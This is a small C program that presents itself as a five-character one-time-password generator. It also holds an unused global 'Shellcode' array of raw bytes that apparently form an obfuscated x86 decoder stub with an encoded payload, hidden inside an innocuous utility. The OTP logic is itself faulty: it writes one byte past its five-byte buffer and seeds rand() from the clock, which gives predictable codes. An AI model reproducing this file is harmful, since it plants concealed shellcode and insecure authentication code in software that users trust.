#include <stdio.h>
#include <time.h>
#include <string.h>
char set[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
char otp[5];
int random();
void generate();
void output();
char Shellcode[]="\xeb\x1e\x5f\x8d\x77\x08\x31\xc9\xb9\x06\x00\x00\x00\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x0d\xe8\xdd\xff\xff\xff\x18\x06\xb2\x95\x58\x47\x7d\x52\x17\x37\x73\x7d\x5a\x84";
int main()
{
	generate();
	output();	
}
void init()
{
	strcpy(set,"");//use to initialize the otp superset with values of your choice
}
int random()
{
	int r;
	srand(time(NULL));
	r=rand();
	return r;
}
void generate()
{
	int r;
	r=random();
	int i=0,j=0;
	while(i<5)
	{
		otp[j]=set[r%62];
		r=r+999;
		j++;
		i++;
	}
	otp[j]='\0';	
}
void output()
{
	printf("%s\n",otp);
}
